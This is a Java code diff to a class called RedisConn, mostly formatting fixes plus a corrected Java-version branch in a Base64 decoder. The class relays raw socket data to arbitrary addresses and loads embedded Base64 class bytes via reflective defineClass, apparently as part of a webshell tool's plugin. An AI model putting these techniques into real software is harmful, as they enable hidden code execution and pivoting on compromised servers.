@@ -85,6 +85,7 @@ public class RedisConn {
         }
         return str;
     }
+
     String Base64Encode(String str) {
         String version = System.getProperty("java.version");
         try {
@@ -104,9 +105,10 @@ public class RedisConn {
             return "";
         }
     }
+
     String SendData(String addr, String context) throws Exception {
         Socket socket = null;
-        try{
+        try {
             socket = createSocket(addr);
         } catch (Exception e) {
             return Base64Encode("ERROR:// " + e.getMessage());
@@ -129,7 +131,7 @@ public class RedisConn {
 //            while ((l = br.readLine()) != null) {
 //                ret += l + "\r\n";
 //            }
-        } catch(SocketTimeoutException ex) {
+        } catch (SocketTimeoutException ex) {
             if (ret.length() != 0) {
                 return Base64Encode(ret);
             }
@@ -146,7 +148,7 @@ public class RedisConn {
     Socket createSocket(String addr) throws Exception {
         Socket socket = null;
         try {
-            String [] inet = addr.split(":");
+            String[] inet = addr.split(":");
             socket = new Socket();
             socket.setReuseAddress(true);
             socket.setKeepAlive(false);
@@ -156,7 +158,7 @@ public class RedisConn {
             socket.setSoTimeout(30);
             return socket;
         } catch (Exception ex) {
-            if(socket != null) {
+            if (socket != null) {
                 socket.close();
             }
             ex.printStackTrace();
@@ -167,28 +169,29 @@ public class RedisConn {
     public String asoutput(String str) {
         try {
             byte[] classBytes = Base64DecodeToByte(decoderClassdata);
-            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
+            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
             defineClassMethod.setAccessible(true);
-            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0,classBytes.length);
+            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0, classBytes.length);
             return cc.getConstructor(String.class).newInstance(str).toString();
         } catch (Exception e) {
             return str;
         }
     }
+
     public byte[] Base64DecodeToByte(String str) {
         byte[] bt = null;
         String version = System.getProperty("java.version");
         try {
             if (version.compareTo("1.9") >= 0) {
-                Class clazz = Class.forName("sun.misc.BASE64Decoder");
-                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
-            } else {
                 Class clazz = Class.forName("java.util.Base64");
                 Object decoder = clazz.getMethod("getDecoder").invoke(null);
                 bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            } else {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
             }
             return bt;
-        }catch (Exception e) {
+        } catch (Exception e) {
             return new byte[]{};
         }
     }
